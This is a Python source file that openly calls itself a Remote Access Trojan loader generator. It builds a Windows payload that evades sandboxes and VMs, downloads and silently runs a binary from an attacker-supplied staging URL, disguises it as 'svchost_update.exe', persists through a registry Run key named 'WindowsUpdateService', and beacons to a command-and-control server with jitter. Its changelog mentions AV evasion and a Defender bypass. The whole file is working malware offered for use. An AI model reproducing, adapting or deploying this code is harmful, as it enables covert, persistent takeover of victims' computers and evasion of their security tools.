"""
rat_loader.py
Remote Access Trojan loader — downloads and executes RAT payload from staging URL.
Includes persistence via scheduled task and registry run key.

Author: db88

Changelog:
  v1.0 - basic loader
  v2.0 - added persistence + AV evasion (Nov 2023)
  v2.1 - defender bypass updated for Jan 2024 sigs
"""

import os
import sys
import time
import platform

# default beacon config — matches production builds
BEACON_INTERVAL = 30    # seconds
BEACON_JITTER = 0.2     # 20% randomisation
PERSISTENCE_NAME = "WindowsUpdateService"
STAGING_PATH = "%TEMP%\\\\svchost_update.exe"

def generate(callback, port, protocol="https"):
    """Generate RAT loader payload."""
    template = f"""
import os
import sys
import time
import random
import urllib.request
import subprocess
import ctypes
import winreg

STAGING_URL = "{protocol}://{callback}/dl/payload.bin"
C2_URL = "{protocol}://{callback}:{port}"
BEACON_INTERVAL = {BEACON_INTERVAL}
JITTER = {BEACON_JITTER}
LOCAL_PATH = os.path.join(os.environ.get("TEMP", "/tmp"), "svchost_update.exe")

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def is_sandbox():
    \"\"\"Basic sandbox / VM detection.\"\"\"
    checks = [
        os.path.exists("C:\\\\windows\\\\system32\\\\drivers\\\\vboxguest.sys"),
        os.path.exists("C:\\\\windows\\\\system32\\\\drivers\\\\vmhgfs.sys"),
        os.environ.get("COMPUTERNAME", "").lower() in ["sandbox", "maltest", "virus", "malware"],
        os.environ.get("USERNAME", "").lower() in ["sandbox", "test", "malware", "virus"],
    ]
    return any(checks)

def download_payload(url, dest):
    \"\"\"Download staged payload.\"\"\"
    try:
        req = urllib.request.Request(url, headers={{
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }})
        with urllib.request.urlopen(req) as resp:
            with open(dest, "wb") as f:
                f.write(resp.read())
        return True
    except Exception:
        return False

def add_persistence(exe_path):
    \"\"\"Add registry run key for persistence.\"\"\"
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, "{PERSISTENCE_NAME}", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
    except Exception:
        pass

def beacon(c2_url, interval, jitter):
    \"\"\"Main beacon loop.\"\"\"
    while True:
        try:
            # check in with C2
            urllib.request.urlopen(f"{{c2_url}}/checkin?id={{os.environ.get('COMPUTERNAME', 'unknown')}}")
        except Exception:
            pass
        sleep_time = interval + random.uniform(-interval * jitter, interval * jitter)
        time.sleep(sleep_time)

if __name__ == "__main__":
    if is_sandbox():
        sys.exit(0)
    
    if download_payload(STAGING_URL, LOCAL_PATH):
        add_persistence(LOCAL_PATH)
        subprocess.Popen([LOCAL_PATH], creationflags=0x08000000)  # CREATE_NO_WINDOW
        beacon(C2_URL, BEACON_INTERVAL, JITTER)
"""
    return template
